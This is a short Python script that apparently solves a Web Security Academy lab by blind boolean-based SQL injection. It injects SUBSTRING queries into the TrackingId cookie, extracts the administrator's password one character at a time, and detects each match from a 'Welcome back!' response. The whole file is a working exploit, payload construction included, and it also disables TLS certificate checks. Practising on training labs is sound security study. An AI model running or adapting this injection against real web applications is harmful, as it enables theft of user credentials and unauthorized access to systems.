import requests
import string
import urllib3

# Remove anoying warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Base url
url = "https://0ab000dd04e081a880329e7400a00072.web-security-academy.net/filter?category=Pets"

# Get the 'current' character of the password an put it in the payload
def getpay(char, i):
    payload = f"'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{char}"
    return payload

# Get the password
def blind(url):
    password = ""
    
    while True:
        i = len(password) + 1
        for char in string.ascii_lowercase + string.digits:
            payload = getpay(char, i)
            headers = {
                "Cookie": f"session=iKW7riqbzdJbw3vqheT8KCQ0HQowa6pE; TrackingId=aGkUsdrzqz3yKoSd{payload}",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
            }
            r = requests.get(url, headers=headers, verify=False)
            # if the string "Welcome back!" is in the response, then the character is in the password
            if "Welcome back!" in r.text:
                password += char
                print(password, end="\r")
                break
        else:
            break

    return password

if __name__ == "__main__":
    print("Senha =", blind(url))
